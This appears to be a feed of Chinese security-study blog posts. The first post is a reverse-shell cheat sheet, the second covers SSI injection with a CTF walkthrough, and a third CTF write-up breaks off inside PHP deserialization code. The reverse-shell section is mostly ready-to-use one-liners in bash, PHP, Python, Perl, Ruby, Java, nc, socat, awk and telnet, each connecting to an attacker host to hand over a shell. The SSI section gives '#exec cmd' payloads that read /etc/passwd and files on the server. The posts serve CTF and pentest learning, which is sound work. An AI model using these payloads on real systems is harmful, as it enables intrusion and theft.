        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>反弹shell（reverse shell）时控制端监听某TCP/UDP端口，受控端发起连接到控制端口，并将其命令行的输入输出转到控制端。</p><p>我们不管在平时的CTF比赛中，还是在做渗透测试，反弹shell经常会用到，使用反弹shell方便自己的机器连接目标机器，从而实现更好的控制</p><h1 id="Bash反弹shell"><a href="#Bash反弹shell" class="headerlink" title="Bash反弹shell"></a>Bash反弹shell</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>我们来分析一下这条命令</p><ul><li><code>bash -i</code>：<code>bash</code>是<code>linux</code>的一个常见的<code>shell</code>，<code>-i</code>参数表示产生交互式的<code>shell</code></li><li><code>/dev/tcp/ip/port</code>：这是<code>linux</code>中的特殊文件，因为<code>linux </code>一切皆文件，我们可以认为这个就是用来发起<code>tcp</code>连接的</li><li><code>&gt;&amp;</code>：将标准错误输出重定向到标准输出中</li><li><code>0&gt;&amp;1</code>：将标准输入重定向到标准输出中</li></ul><p>这里最不好理解的就是重定向，接下来我们来了解一下<code>linux</code>重定向</p><h2 id="硬件设备和文件描述符"><a href="#硬件设备和文件描述符" class="headerlink" title="硬件设备和文件描述符"></a>硬件设备和文件描述符</h2><p>计算机的硬件设备有很多，在<code>linux</code>中一切皆文件，包括标准输入设备和标准输出设备。</p><p>为了表示和区分已经打开的文件，<code>linux</code>会给每个文件分配一个<code>ID</code>，这个<code>ID</code>是一个整数，被称为<code>文件描述符</code>。</p><table><thead><tr><th>文件描述符</th><th>文件名</th><th>类型</th><th>硬件</th></tr></thead><tbody><tr><td>0</td><td>stdin</td><td>标准输入文件</td><td>默认设备（键盘）</td></tr><tr><td>1</td><td>stdout</td><td>标准输出文件</td><td>默认设备（显示器）</td></tr><tr><td>2</td><td>stderr</td><td>标准错误输出文件</td><td>默认设备（显示器）</td></tr></tbody></table><p><code>linux</code>程序在执行任何形式的<code>I/O</code>操作时，都是在读取或者写入一个文件描述符。这三个文件默认情况下都是打开的，在重定向的过程中，可以直接使用文件描述符。</p><h2 id="Linux-Shell重定向"><a href="#Linux-Shell重定向" class="headerlink" title="Linux Shell重定向"></a>Linux Shell重定向</h2><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p><ol><li>输入重定向<code>&lt;</code>、<code>&lt;&lt;</code></li><li>输出重定向<code>&gt;</code>、<code>&gt;&gt;</code></li></ol><p>在输入重定向中，<code>&lt;</code>表示标准输入重定向，<code>&lt;&lt; tag</code>表示将开始标记<code>tag</code>和结束标记<code>tag</code>直接的内容作为输入。</p><p>在输出重定向中，<code>&gt;</code>表示标准输出重定向（直接覆盖文件），<code>&gt;&gt;</code>表示将输出进行追加文件。</p><p>我们通过分析<code>bash反弹shell</code>来学习重定向</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>使用<code>&gt;&amp;</code>其实是一种简略的写法，它和<code>&amp;&gt;</code>一样表示将<strong>标准错误输出</strong>重定向到<strong>标准输出</strong>中，我们还可以通过在末尾添加<code>2&gt;&amp;1</code>来实现这种效果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">/bin/bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>我们再来说一说最后的<code>0&gt;&amp;1</code>，这句话很好解释，就是将<strong>标准输入</strong>重定向给<strong>标准输出</strong>，在开头的我们已经将标准输出重定向到了<code>/dev/tcp/ip/port</code>上，然后再将标准输入也重定向到那，结果如下图</p><p><img src="/post/2022-01/Linux%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/202201121546840.png" alt="demo"></p><p>所以就实现了输入和输出都在攻击者的机器上显示，从而实现了反弹shell的作用</p><p>这里提到的<code>/dev/tty</code>是控制终端设备的特殊文件</p><p>不仅这样，反弹shell还可以这样写</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port &lt;&amp;2</span><br><span class="line">或者</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&lt;&amp;2</span><br></pre></td></tr></table></figure><p>最后的<code>0&lt;&amp;2</code>一开始觉得是将<strong>标准错误输出</strong>重定向到<strong>标准输入</strong>，但是如果这样解释的话，最后的结果应该是这样的</p><p><img src="/post/2022-01/Linux%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/202201121546841.png" alt="反弹shell2"></p><p>显然这不是我们想要的结果，通过查阅资料，了解到<code>0&gt;&amp;2</code>和<code>0&lt;&amp;2</code>是相同的，都是将<strong>标准输入</strong>重定向到<strong>标准错误输出</strong></p><p>查了很久，个人觉得这里的<code>0&gt;&amp;2</code>就是特殊用法，我们最规范的用法如下<code>0&lt;</code>标准输入重定向</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0&lt; === &lt;// &lt;就是标准输入重定向，效果于0&lt;相同</span><br><span class="line">1&gt; === &gt;// &gt;就是标准输出重定向，效果于1&gt;相同</span><br></pre></td></tr></table></figure><p>PS：个人觉得这里还挺绕的，在之后的学习中希望可以有更新的认知！</p><h1 id="其他常用的反弹shell"><a href="#其他常用的反弹shell" class="headerlink" title="其他常用的反弹shell"></a>其他常用的反弹shell</h1><h2 id="PHP反弹shell"><a href="#PHP反弹shell" class="headerlink" title="PHP反弹shell"></a>PHP反弹shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;ip&quot;,9999);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p>这里的文件描述符<code>3</code>就是前面由<code>PHP</code>创建的<code>socket</code>进程，然后将标准输入，标准输出，标准错误输出全部都重定向到该进程</p><h2 id="Python反弹shell"><a href="#Python反弹shell" class="headerlink" title="Python反弹shell"></a>Python反弹shell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Perl反弹shell"><a href="#Perl反弹shell" class="headerlink" title="Perl反弹shell"></a>Perl反弹shell</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Ruby反弹shell"><a href="#Ruby反弹shell" class="headerlink" title="Ruby反弹shell"></a>Ruby反弹shell</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;192.168.1.120&quot;,&quot;3333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ruby不需要调用系统的/bin/bash进行反弹shell，所以流量中只有执行的命令。</p><h2 id="Java反弹shell"><a href="#Java反弹shell" class="headerlink" title="Java反弹shell"></a>Java反弹shell</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把该代码保存为<code>Revs.java</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac Revs.java</span><br><span class="line">java Revs</span><br></pre></td></tr></table></figure><p><code>Java</code>使用<code>Runtime.getRuntime().exec()</code>调用服务器命令进行反弹shell。</p><h2 id="反弹shell的一些骚姿势"><a href="#反弹shell的一些骚姿势" class="headerlink" title="反弹shell的一些骚姿势"></a>反弹shell的一些骚姿势</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;&#123;echo,反弹shell的base64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/ip/port</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> /bin/sh 0&lt;/dev/tcp/ip/port 1&gt;&amp;0 2&gt;&amp;0</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</span><br><span class="line"></span><br><span class="line">nc -e /bin/bash ip port</span><br><span class="line"></span><br><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:ip:port</span><br><span class="line"></span><br><span class="line">awk <span class="string">&#x27;BEGIN&#123;s=&quot;/inet/tcp/0/ip/port&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">telnet ip port1 | /bin/bash | telnet ip port2</span><br></pre></td></tr></table></figure><p><code>telnet</code>的第一个<code>port</code>用来连接机器，第二个<code>port</code>用来连接<code>bash</code></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/2549">Linux反弹shell的本质</a></p><p><a href="http://www.codebaoku.com/it-shell/it-shell-218534.html">反弹shell的几种姿势小结</a></p><p><a href="https://www.cocosec.com/archives/575.html">linux反弹shell流量分析</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反弹shell </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSI注入漏洞总结</title>
      <link href="/post/2022-01/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/post/2022-01/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在前几天的<code>长安战疫CTF</code>中第一次遇到了<code>SSI</code>注入漏洞，借此机会学习一波<code>SSI</code></p><p>现在大多数的<code>Web</code>服务已经很少使用<code>SSI</code>了，但是偶尔还是可能碰到</p><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p><code>SSI</code>全称<code>Server Side Includes</code>，即服务器端包含，事一种基于服务器端的网页制作技术。<code>SSI</code>是嵌入<code>html</code>页面中的指令，在页面被请求时由服务器进行运算，对现有的<code>html</code>页面增加动态生成的内容，而无需通过<code>CGI</code>程序提供其整个页面，或者使用其他动态技术。</p><p>这里再提一下<code>CGI</code>的作用：<code>CGI</code>程序是在Web服务器处理动态脚本请求时<code>fork</code>出来的进程，然后将动态脚本交给<code>CGI</code>程序来处理，在我之前的文章也有提到过：<a href="https://seizer.top/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/#%E9%85%8D%E7%BD%AEPHP%E7%8E%AF%E5%A2%83%E4%B8%AD%E5%87%BA%E7%8E%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98">LAMP和LNMP环境搭建的艰难过程</a></p><p>回到主题<code>SSI</code>，<code>SSI</code>可以将一些独立的<code>html</code>文件给包含进来，从而不需要反复的编写一样的代码，但是它不仅如此，还可以注入脚本或远程执行任意代码。</p><p><code>SHTML</code>文件（<code>stm</code>、<code>shtm</code>）即<code>Server-Parsed HTML</code>，该文件就是应用了<code>SSI</code>技术的文件，所以在<code>shtml</code>文件页面返回客户端前，页面中的<code>SSI</code>指令将被服务器解析。</p><p>现在的<code>Web服务器</code>默认应该都是不开启<code>SSI</code>功能的，所以需要手动开启，开启方法特别简单，只需要修改配置文件即可，这里就不过多阐述了。</p><h1 id="SSI基本语法"><a href="#SSI基本语法" class="headerlink" title="SSI基本语法"></a><code>SSI</code>基本语法</h1><p>在<code>shtml</code>文件中<code>SSI</code>标签使用的几种基本语法如下，必须注意的是其语法格式必须是以<code>html</code>的注释符<code>&lt;!--</code>开头、且后面紧接<code>#</code>符号和<code>SSI</code>命令，它们期间不能存在空格：</p><p><code>#config</code>：指定返回到client浏览器的错误消息、日期和文件大小所使用的格式。</p><p><code>#echo</code>：在 HTML 页中插入环境变量的值。</p><p><code>#exec</code>：执行一个应用程序或一条 shell 命令并将输出插入到 HTML 页中。</p><p><code>#flastmod</code>：将文件改动日期插入到 HTML 页中。</p><p><code>#fsize</code>：将文件大小插入到 HTML 页中。</p><p><code>#include</code>：在 HTML 或 ASP 页中包括文件。</p><p><strong>1.显示服务器端环境变量<code>&lt;#echo&gt;</code></strong></p><p>本文档名称：<code>&lt;!--#echo var=&quot;DOCUMENT_NAME&quot;--&gt;</code></p><p>现在时间：<code>&lt;!--#echo var=&quot;DATE_LOCAL&quot;--&gt;</code></p><p>显示<code>IP</code>地址：<code>&lt;!--#echo var=&quot;REMOTE_ADDR&quot;--&gt;</code></p><p><strong>2、将文本内容直接插入到文档中<code>&lt;#include&gt;</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file=&quot;文件名称&quot;--&gt;</span><br><span class="line">&lt;!--#include virtual=&quot;index.html&quot; --&gt;</span><br><span class="line">&lt;!--#include virtual=&quot;文件名称&quot;–&gt;</span><br><span class="line">&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;</span><br></pre></td></tr></table></figure><p>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径。</p><p><strong>3、显示WEB文档相关信息<code>&lt;#flastmod&gt;&lt;#fsize&gt;</code>(如文件制作日期/大小等)</strong></p><p>文件最近更新日期：<code>&lt;! #flastmod file=&quot;文件名称&quot;–&gt;</code></p><p>文件的长度：<code>&lt;!--#fsize file=&quot;文件名称&quot;--&gt;</code></p><p><strong>4、直接执行服务器上的各种程序<code>&lt;#exec&gt;</code>(如<code>CGI</code>或其他可执行程序)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!–#exec cmd=&quot;文件名称&quot;–&gt;</span><br><span class="line">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--</span><br><span class="line">&lt;!–#exec cgi=&quot;文件名称&quot;–&gt;</span><br><span class="line">&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt;</span><br></pre></td></tr></table></figure><p>将某一外部程序的输出插入到页面中。可插入<code>CGI程序</code>或者是常规应用程序的输入，这取决于使用的参数是<code>cmd</code>还是<code>CGI</code>。</p><h1 id="SSI注入漏洞"><a href="#SSI注入漏洞" class="headerlink" title="SSI注入漏洞"></a><code>SSI</code>注入漏洞</h1><p>明白了<code>SSI</code>的语法，我们发现居然可以任意执行命令，如果页面内容可控就会导致漏洞的产生。</p><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p>Web服务器支持并开启了<code>SSI</code>；</p><p>Web应用程序在返回HTML页面时，嵌入了用户输入的内容；</p><p>外部输入的参数值未进行有效的过滤；</p><h2 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h2><p>比如，一个存在<code>反射型XSS漏洞</code>的页面，如果输入的<code>payload</code>不是<code>XSS</code>代码而是<code>SSI</code>的标签，同时服务器又开启了对<code>SSI</code>的支持的话就会存在<code>SSI注入漏洞</code>。</p><p>在或者，一个存在文件上传漏洞的页面，也可以构造<code>shtml</code>文件进行上传，从而可以实现远程命令执行。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>靶场环境：<a href="https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce">https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce</a></p><p>我们上传一个<code>shtml</code>文件</p><p><img src="/post/2022-01/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/202201120022398.png" alt="image-20220111235245925"></p><p>上传成功后我们访问<code>shell.shtml</code>，执行了系统命令</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog4/202201120022400.png" alt="image-20220111235406350"></p><h1 id="长安战疫baby-upload复盘"><a href="#长安战疫baby-upload复盘" class="headerlink" title="长安战疫baby_upload复盘"></a>长安战疫baby_upload复盘</h1><p>四叶草这次的比赛有复盘，简直太秒了！</p><p>这个题过滤了<code>ph</code>、<code>ini</code>、<code>.htaccess</code>，所以菜鸡的我当时就不知道该怎么写了。</p><p>我们直接进行<code>SSI</code>注入，发现过滤了好多的命令，可以使用<code>dir /</code>查看文件</p><p><img src="/post/2022-01/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/202201120022401.png" alt="image-20220112000350636"></p><p>访问页面得到</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apphome   root start.sh</span><br><span class="line">binlib    run sys</span><br><span class="line">bootlib64  run.sh tmp</span><br><span class="line">create_mysql_admin_user.shmedia  sbin usr</span><br><span class="line">devmnt    srv var</span><br><span class="line">etcopt    start-apache2.sh</span><br><span class="line">fffffflllll11111aaaaa4444gggggproc   start-mysqld.sh</span><br></pre></td></tr></table></figure><p>看到<code>flag</code>文件，进行读取，但是发现过滤了<code>fl</code>，也过滤了很多读取命令，<code>fl</code>可以使用通配符<code>?</code>绕过，读取命令看<code>wp</code>用了<code>cut</code>命令进行读取</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;cut -b 1-100 /fffff?lllll11111aaaaa4444ggggg&quot; --&gt;</span></span><br><span class="line">或者</span><br><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;cut -c 1-100 /fffff?lllll11111aaaaa4444ggggg&quot; --&gt;</span></span><br></pre></td></tr></table></figure><ul><li>-b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。</li><li>-c ：以字符为单位进行分割。</li></ul><p>还有<code>EDI</code>战队的<code>wp</code>里，使用<code>tar</code>命令将文件进行了打包，然后将打包文件直接下载了下来，这波操作我只能说高呼666，又学到了骚操作。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;tar cvf /var/www/html/upload/d7efaae655f6177619403045edc9ae32/2.tar / --exclude=/bin --exclude=app --exclude=home --exclude=root --exclude=run --exclude=lib --exclude=sys --exclude=tmp --exclude=usr --exclude=var --exclude=mnt --exclude=opt --exclude=etc --exclude=dev --exclude=boot --exclude=bin --exclude=proc --exclude=sbin --exclude=media&quot;--&gt;</span></span><br></pre></td></tr></table></figure><h1 id="扩展：动态内容缓存技术"><a href="#扩展：动态内容缓存技术" class="headerlink" title="扩展：动态内容缓存技术"></a>扩展：动态内容缓存技术</h1><p><code>SSI</code>属于动态内容缓存技术的一种，当一个页面大部分是可静态的，但是又一部分却需要时动态的，如果经过<code>cgi</code>程序进行解析将会增大服务器的压力，所以就出现了动态内容缓存技术。</p><p>最常见的技术有三种： <code>CSI</code>、<code>SSI</code>、<code>ESI</code></p><table><thead><tr><th>应用模式</th><th>指令模式</th><th>页面后缀</th><th></th></tr></thead><tbody><tr><td><code>CSI</code></td><td>客户端</td><td>无需指令，ajax/iframe实现 无需服务器支持</td><td>常见后缀</td></tr><tr><td><code>SSI</code></td><td>服务端</td><td>SSI专用指令需要专用服务器支持</td><td><code>.shtml</code>，<code>.inc</code>或者常见后缀</td></tr><tr><td><code>ESI</code></td><td>服务端</td><td>ESI专用指令 需要专用服务器支持</td><td>常见后缀</td></tr></tbody></table><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">SSI注入漏洞总结</a></p><p><a href="https://blog.51cto.com/u_15065851/4639022">SSI学习</a></p><p><a href="https://blog.csdn.net/shanhuhau/article/details/40711157">动态缓存技术</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSI </tag>
            
            <tag> shtml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西电抗疫CTF(组队赛)</title>
      <link href="/post/2022-01/%E8%A5%BF%E7%94%B5%E6%8A%97%E7%96%ABCTF(%E7%BB%84%E9%98%9F%E8%B5%9B)/"/>
      <url>/post/2022-01/%E8%A5%BF%E7%94%B5%E6%8A%97%E7%96%ABCTF(%E7%BB%84%E9%98%9F%E8%B5%9B)/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没想到第一次拿一血还是因为被做核酸叫起来，然后睡不着做的题！</p><p><img src="/post/2022-01/%E8%A5%BF%E7%94%B5%E6%8A%97%E7%96%ABCTF(%E7%BB%84%E9%98%9F%E8%B5%9B)/202201101800229.jpg" alt="Screenshot_20220110_175721_edit_569306001377192"></p><p><img src="/post/2022-01/%E8%A5%BF%E7%94%B5%E6%8A%97%E7%96%ABCTF(%E7%BB%84%E9%98%9F%E8%B5%9B)/202201101800014.jpg" alt="Screenshot_20220110_175105_com.tencent.mobileqq_e"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$p1</span>, <span class="variable">$p2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;var1 = <span class="variable">$p1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;var2 = <span class="variable">$p2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;var1-&gt;secret = <span class="keyword">$this</span>-&gt;var2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Hello();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$p1</span>, <span class="variable">$p2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$p2</span>-&gt;<span class="variable">$p1</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to 西电战役CTF!&quot;</span>;</span><br><span class="line">    